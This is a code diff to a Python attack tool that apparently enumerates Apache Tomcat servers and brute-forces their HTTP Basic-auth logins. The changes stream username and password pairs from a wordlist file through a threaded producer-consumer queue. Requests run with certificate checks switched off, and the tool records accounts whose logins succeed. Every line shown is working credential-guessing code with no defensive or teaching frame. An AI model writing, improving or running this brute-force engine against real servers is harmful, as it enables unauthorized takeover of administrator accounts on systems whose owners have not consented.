@@ -72,18 +72,25 @@ def enumerate_tomcat(ip, port):
     return version, found_paths
 
 class BruteForceEngine:
-    def __init__(self, url, creds):
+    def __init__(self, url, u_list, p_file, total):
         self.url = url
-        self.creds = creds
-        self.queue = Queue()
+        self.u_list = u_list
+        self.p_file = p_file
+        self.total = total
+        self.queue = Queue(maxsize=1000)
         self.found_accounts = []
         self.pbar = None
 
     def worker(self):
         # Use a Session for connection pooling (much faster)
         session = requests.Session()
-        while not self.queue.empty():
-            user, pwd = self.queue.get()
+        while True:
+            task = self.queue.get()
+            if task is None:
+                self.queue.task_done()
+                break
+            
+            user, pwd = task
             try:
                 r = session.get(self.url, auth=(user, pwd), timeout=TIMEOUT, verify=False)
                 if r.status_code == 200:
@@ -95,11 +102,22 @@ class BruteForceEngine:
             self.pbar.update(1)
             self.queue.task_done()
 
+    def producer(self):
+        with open(self.p_file, 'r', errors='ignore') as pf:
+            for line in pf:
+                p = line.strip()
+                if not p: continue
+                if ':' in p:
+                    parts = p.split(':', 1)
+                    self.queue.put((parts[0], parts[1]))
+                else:
+                    for u in self.u_list:
+                        self.queue.put((u, p))
+        for _ in range(MAX_THREADS):
+            self.queue.put(None)
+
     def run(self):
-        for c in self.creds:
-            self.queue.put(c)
-        
-        self.pbar = tqdm(total=len(self.creds), desc=f"Brute Forcing", unit="req", dynamic_ncols=True)
+        self.pbar = tqdm(total=self.total, desc=f"Brute Forcing", unit="req", dynamic_ncols=True)
         
         threads = []
         for _ in range(MAX_THREADS):
@@ -108,7 +126,11 @@ class BruteForceEngine:
             t.start()
             threads.append(t)
             
-        self.queue.join() # Wait for queue to empty
+        prod = threading.Thread(target=self.producer)
+        prod.daemon = True
+        prod.start()
+            
+        self.queue.join()
         self.pbar.close()
         return self.found_accounts
 
@@ -184,39 +206,35 @@ def main():
         print(f"[+] Using default targeted users ({len(users)}).")
 
     # Process Passwords & Combine
-    creds = []
     if not os.path.exists(p_list_path):
         print(f"[-] Error: Password file '{p_list_path}' not found. Exiting.")
         sys.exit(1)
         
     try:
+        total_creds = 0
         with open(p_list_path, 'r', errors='ignore') as pf:
-            passwords = [line.strip() for line in pf if line.strip()]
-            
-        if not passwords:
-            print(f"[-] Error: Password file '{p_list_path}' is empty. Exiting.")
-            sys.exit(1)
-            
-        # Build Cartesian product (or parse user:pass directly if detected in pwd file)
-        for p in passwords:
-            if ':' in p:
-                parts = p.split(':', 1)
-                creds.append((parts[0], parts[1]))
-            else:
-                for u in users:
-                    creds.append((u, p))
-                    
+            for line in pf:
+                p = line.strip()
+                if not p: continue
+                if ':' in p:
+                    total_creds += 1
+                else:
+                    total_creds += len(users)
     except Exception as e:
         print(f"[-] Error reading password wordlist: {e}")
         sys.exit(1)
         
-    print(f"[+] Wordlists successfully processed. Total combinations to test: {len(creds)}")
+    if total_creds == 0:
+        print(f"[-] Error: Password file '{p_list_path}' is empty. Exiting.")
+        sys.exit(1)
+        
+    print(f"[+] Wordlists successfully processed. Total combinations to test: {total_creds}")
 
     # --- PHASE 5: Brute Force ---
     print("\n[*] Phase 5: Executing Brute Force Attack, break a leg...")
     for target_url in all_targets:
         print(f"\n[*] Targeting: {target_url}")
-        engine = BruteForceEngine(target_url, creds)
+        engine = BruteForceEngine(target_url, users, p_list_path, total_creds)
         try:
             results = engine.run()
         except KeyboardInterrupt:
